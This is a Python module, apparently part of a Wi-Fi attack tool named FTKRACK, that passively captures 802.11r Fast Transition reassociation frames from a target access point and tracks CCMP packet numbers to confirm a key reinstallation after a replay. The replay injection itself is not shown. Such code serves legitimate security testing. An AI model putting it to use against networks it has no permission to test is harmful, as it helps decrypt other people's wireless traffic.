"""Passive observation layer for FTKRACK.

Classifies eavesdropped frames and keeps the evidence counters that the engine
uses to decide whether a key reinstallation actually happened.  It never
transmits and it never declares success on intent alone.

Evidence model
--------------
1. A structurally valid FT Reassociation Request (MDIE + FTIE with non-zero
   MIC/SNonce/ANonce) must be captured from the *target* AP.
2. After replay starts, a status-0 Reassociation Response from the target AP
   for the *same station* must be observed inside the replay window.
3. CCMP packet numbers are tracked per (AP, client, TID) and only for the
   captured station.  AP-to-client retransmissions are excluded because they
   legitimately repeat a PN.  A PN from the AP to the captured station that
   was already used for the same TID before replay, or that regresses against
   that TID's pre-replay maximum, is the reinstallation signal.

Keeping PN state per client and TID matters: every STA has its own PTK and
every QoS TID has its own PN.  Pooling either would let ordinary traffic to a
different client or a quiet queue produce a false positive.
"""

from __future__ import annotations

import time
from typing import Optional

from . import dot11

MAX_PNS_PER_TID = 4096
REPLAY_WINDOW_S = 12.0


class CaptureEngine:
    def __init__(self, target_bssid: Optional[str] = None):
        self.target_bssid = (target_bssid or "").lower() or None
        self.frames_seen = 0
        self.reassoc_requests = 0
        self.reassoc_responses = 0
        self.ft_requests = 0
        self.ft_request: Optional[dict] = None
        self.captured_sta: Optional[str] = None
        self.responses: list[dict] = []
        self.pn_before: dict[tuple, set[int]] = {}
        self.pn_after: dict[tuple, set[int]] = {}
        self.pn_before_max: dict[tuple, int] = {}
        self.pn_after_max: dict[tuple, int] = {}
        self.pn_reuse_exact = 0
        self.pn_regression = 0
        self.retries_ignored = 0
        self.replay_active = False
        self.replay_accepted = False
        self.replay_started_at = 0.0
        self.replay_window_until = 0.0
        self.running_pn = {}

    # ------------------------------------------------------------------
    def _in_replay_window(self) -> bool:
        return (self.replay_active and
                time.monotonic() <= self.replay_window_until)

    def note_replay(self, accepted_writes: int):
        """Record a real replay attempt and open the observation window."""
        now = time.monotonic()
        self.replay_active = True
        self.replay_accepted = accepted_writes > 0
        self.replay_started_at = now
        self.replay_window_until = now + REPLAY_WINDOW_S

    def set_replay_active(self, active: bool = True, accepted=None):
        """Phase-only setter.  Never fabricates an accepted kernel write.

        Use note_replay(accepted_writes) after a real injection attempt.
        """
        if not active:
            self.replay_active = False
            self.replay_accepted = False
            self.replay_window_until = 0.0
        elif accepted is not None:
            self.note_replay(1 if accepted else 0)
        else:
            now = time.monotonic()
            self.replay_active = True
            self.replay_started_at = now
            self.replay_window_until = now + REPLAY_WINDOW_S

    def clear(self):
        self.__init__(self.target_bssid)

    def _matches_target(self, value: str) -> bool:
        return not self.target_bssid or str(value).lower() == self.target_bssid

    def _note_pn(self, info: dict) -> dict:
        tx = info["transmitter"]
        if not self._matches_target(tx):
            return {"kind": "pn", "ignored": True, "reason": "other-ap"}
        if info.get("retry"):
            # MAC-layer retransmits reuse the same CCMP PN by design.
            self.retries_ignored += 1
            return {"kind": "pn", "ignored": True, "reason": "retry"}
        if self.captured_sta and str(info.get("destination", "")).lower() != \
                self.captured_sta.lower():
            return {"kind": "pn", "ignored": True, "reason": "other-sta"}
        if self.replay_active and not self._in_replay_window():
            return {"kind": "pn", "ignored": True, "reason": "window-expired"}

        # Separate PTKs (one per station) and separate QoS TIDs each maintain
        # their own CCMP PN.  Pooling them would manufacture false reuse.
        key = (tx.lower(), str(info.get("destination", "")).lower(),
               int(info["tid"]))
        pn = info["pn"]
        self.running_pn[key] = pn

        if self._in_replay_window():
            before = self.pn_before.get(key, set())
            if pn in before:
                self.pn_reuse_exact += 1
            if self.pn_before_max.get(key, 0) and pn <= self.pn_before_max[key]:
                self.pn_regression += 1
            after = self.pn_after.setdefault(key, set())
            if len(after) < MAX_PNS_PER_TID:
                after.add(pn)
            self.pn_after_max[key] = max(self.pn_after_max.get(key, 0), pn)
        else:
            before = self.pn_before.setdefault(key, set())
            if len(before) < MAX_PNS_PER_TID:
                before.add(pn)
            self.pn_before_max[key] = max(self.pn_before_max.get(key, 0), pn)

        return {
            "kind": "pn", "transmitter": tx, "destination": key[1],
            "tid": key[2], "pn": pn,
            "after_replay": self._in_replay_window(),
            "reuse_exact": self.pn_reuse_exact,
            "regression": self.pn_regression,
        }

    # ------------------------------------------------------------------
    def feed(self, buf: bytes) -> Optional[dict]:
        """Feed one raw capture buffer (radiotap + 802.11).  Returns an event."""
        if not buf:
            return None
        frame80211, rt = dot11.strip_radiotap(buf)
        if frame80211 is None:
            return None
        self.frames_seen += 1

        frame = dot11.parse_dot11(frame80211)
        if frame is None:
            return None

        if frame.ftype == dot11.TYPE_MGT and frame.subtype == dot11.MGT_REASSOC_REQ:
            return self._on_reassoc_req(frame, rt)
        if frame.ftype == dot11.TYPE_MGT and frame.subtype == dot11.MGT_REASSOC_RESP:
            return self._on_reassoc_resp(frame, rt)
        if frame.ftype == dot11.TYPE_DATA:
            ccmp = dot11.parse_ccmp_data(frame)
            if ccmp:
                return self._note_pn(ccmp)
        return None

    def _on_reassoc_req(self, frame: dot11.Dot11Frame, rt: Optional[dict]) -> dict:
        self.reassoc_requests += 1
        req = dot11.parse_reassoc_req(frame)
        if not req or not self._matches_target(req["bssid"]):
            return {"kind": "reassoc_req", "ft_valid": False, "ignored": True}
        if req["ft_valid"]:
            self.ft_requests += 1
            if not self.ft_request:
                rt = rt or {}
                self.ft_request = dict(req)
                self.ft_request.update({
                    "seen_at": time.time(),
                    "channel_hz": rt.get("channel_hz", 0),
                    "signal_dbm": rt.get("signal_dbm"),
                })
                self.captured_sta = req["sta"]
                if not self.target_bssid:
                    self.target_bssid = req["bssid"].lower()
        return {
            "kind": "reassoc_req", "ft_valid": bool(req["ft_valid"]),
            "bssid": req["bssid"], "sta": req["sta"], "ssid": req["ssid"],
            "mdid": req["mdie"]["mdid"] if req["mdie"] else None,
        }

    def _on_reassoc_resp(self, frame: dot11.Dot11Frame, rt: Optional[dict]) -> dict:
        self.reassoc_responses += 1
        resp = dot11.parse_reassoc_resp(frame)
        if not resp or not self._matches_target(resp["bssid"]):
            return {"kind": "reassoc_resp", "ignored": True, "reason": "other-ap"}
        if self.captured_sta and resp["sta"].lower() != self.captured_sta.lower():
            return {"kind": "reassoc_resp", "ignored": True, "reason": "other-sta"}
        after_replay = self._in_replay_window()
        item = dict(resp)
        item["seen_at"] = time.time()
        item["after_replay"] = after_replay
        if len(self.responses) < 256:
            self.responses.append(item)
        return {
            "kind": "reassoc_resp", "status": resp["status"],
            "success": resp["success"], "aid": resp["aid"],
            "bssid": resp["bssid"], "after_replay": after_replay,
        }

    # ------------------------------------------------------------------
    def proof(self) -> dict:
        """Evaluate evidence.  Every condition must be independently met."""
        reasons = []
        if not self.ft_request:
            reasons.append("no structurally valid FT reassociation request captured")
        if not self.replay_active:
            reasons.append("replay phase never started")
        if not self.replay_accepted:
            reasons.append("no replay frame was accepted by the kernel socket")

        success_resp = [r for r in self.responses
                        if r.get("after_replay") and r.get("success")]
        if not success_resp:
            reasons.append("no status-0 reassociation response for the captured "
                           "station after replay")
        if not (self.pn_reuse_exact or self.pn_regression):
            reasons.append("no per-TID CCMP PN reuse or regression after replay")

        confirmed = not reasons
        detail = ("FT reassociation replay accepted; AP PTK/TK reinstall "
                  "consistent with per-TID CCMP PN reuse" if confirmed
                  else "; ".join(reasons))
        return {
            "confirmed": confirmed,
            "detail": detail,
            "reasons": reasons,
            "success_responses_after_replay": len(success_resp),
            "pn_reuse_exact": self.pn_reuse_exact,
            "pn_regression": self.pn_regression,
        }

    def snapshot(self) -> dict:
        ft = self.ft_request or {}
        ftie = ft.get("ftie") or {}
        mdie = ft.get("mdie") or {}
        return {
            "frames_seen": self.frames_seen,
            "reassoc_requests": self.reassoc_requests,
            "ft_requests": self.ft_requests,
            "reassoc_responses": self.reassoc_responses,
            "target_bssid": self.target_bssid or "",
            "captured": bool(self.ft_request),
            "ssid": ft.get("ssid", ""),
            "sta": ft.get("sta", ""),
            "mdid": mdie.get("mdid"),
            "snonce": ftie.get("snonce", b"").hex() or None,
            "anonce": ftie.get("anonce", b"").hex() or None,
            "mic": ftie.get("mic", b"").hex() or None,
            "channel_hz": ft.get("channel_hz", 0),
            "signal_dbm": ft.get("signal_dbm"),
            "raw_len": len(ft.get("raw", b"")),
            "responses_after_replay": sum(1 for r in self.responses
                                          if r.get("after_replay") and r.get("success")),
            "pn_before_count": sum(len(s) for s in self.pn_before.values()),
            "pn_before_max": max(self.pn_before_max.values(), default=0),
            "pn_after_count": sum(len(s) for s in self.pn_after.values()),
            "pn_after_max": max(self.pn_after_max.values(), default=0),
            "pn_reuse_exact": self.pn_reuse_exact,
            "pn_regression": self.pn_regression,
            "retries_ignored": self.retries_ignored,
            "replay_active": self.replay_active,
            "replay_accepted": self.replay_accepted,
            "proof": self.proof(),
        }
